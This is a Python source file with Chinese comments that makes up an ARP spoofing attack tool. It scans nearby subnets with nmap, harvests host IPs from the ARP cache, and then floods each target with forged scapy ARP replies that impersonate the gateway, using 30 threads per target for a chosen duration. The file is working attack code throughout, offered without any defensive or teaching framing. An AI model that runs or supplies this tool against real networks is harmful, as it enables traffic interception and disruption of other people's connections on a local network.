import os
import time
import subprocess
from threading import Thread

from scapy.all import getmacbyip, sendp, Ether, ARP
import netifaces


def get_routing_nicname():
    '''获取当前网卡名称'''

    return netifaces.gateways(
    )['default'][netifaces.AF_INET][1]  # 获取当前网卡名称


def get_cur_ip():
    '''获取本机ip'''

    routing_nicname = netifaces.gateways(
    )['default'][netifaces.AF_INET][1]  # 获取当前网卡名称
    cur_ip = netifaces.ifaddresses(routing_nicname)[
        netifaces.AF_INET][0]['addr']  # 获取当前ip
    return cur_ip


def get_gateway_ip():
    '''获取当前网关ip'''

    return netifaces.gateways(
    )['default'][netifaces.AF_INET][0]  # 获取当前网关ip


def cach_ip(cmd, delay_time):
    '''扫描ip，使其缓存至arp缓存表
        :param cmd: 要执行的命令
        :param delay_time: nmap扫描时长
    '''
    p = subprocess.Popen(cmd, shell=True)
    time.sleep(delay_time)
    p.kill()


def get_ip_list():
    '''获取当前网关下所有ip'''

    gtw_ip_list = get_gateway_ip().split('.')

    nmap_ips = []
    start_ip = int(gtw_ip_list[2]) - 1

    for i in range(start_ip, start_ip + 3):
        nmap_ips.append(gtw_ip_list[0] + '.' + gtw_ip_list[1] +
                        '.' + str(i) + '.0/24')

    nmap_threads = []
    print("正在扫描ip......")
    for nmap_ip in nmap_ips:
        nmap_cmd = "nmap %s" % nmap_ip
        print(nmap_cmd)
        nmap_threads.append(
            Thread(target=cach_ip, args=(nmap_cmd, 5)))

    for thread in nmap_threads:
        thread.start()

    print("正在等待扫描结果.....")

    print('***********************************************************')
    p = os.popen("arp -a")  # 获取arp缓存表
    raw_info_list = p.read().split(' ')
    result_list = [item.strip('(').strip(')')
                   for item in raw_info_list if '(' and ')' in item and item[1] != 'i']
    return result_list


def arpspoof(gateway_ip, self_ip, attack_time, *target_ip):
    ''' ARP欺骗攻击
    :param target_ip: 要攻击的ip
    :param gateway_ip: 要伪装成的ip
    :param self_ip: 本机ip
    :param attack_time: 攻击时长
    '''

    assert type(attack_time) == int, \
        '''the type of attack_time must by int'''

    attacker_threads = []
    for ip in target_ip:
        self_mac = getmacbyip(self_ip)
        tgt_mac = getmacbyip(ip)
        # print("self_mac: ", self_mac)
        ether = Ether(src=self_mac, dst=tgt_mac)
        arp = ARP(hwsrc=self_mac, hwdst=tgt_mac,
                  psrc=gateway_ip, pdst=ip, op=2)

        for _ in range(30):
            attacker_threads.append(
                Thread(target=attacker, args=(ether, arp, attack_time)))

    for thread in attacker_threads:
        thread.start()

    for thread in attacker_threads:
        thread.join()

    return


def attacker(ether, arp, attack_time):
    ''' 开始攻击
    :param ether: ARPSpoofer.arpspoof方法传递
    :param attack_time: ARPSpoofer.arpspoof方法传递
    '''
    start_time = time.time()
    try:
        while time.time() - start_time < attack_time:
            sendp(ether / arp)
    except Exception as e:
        print(e)
    exit()
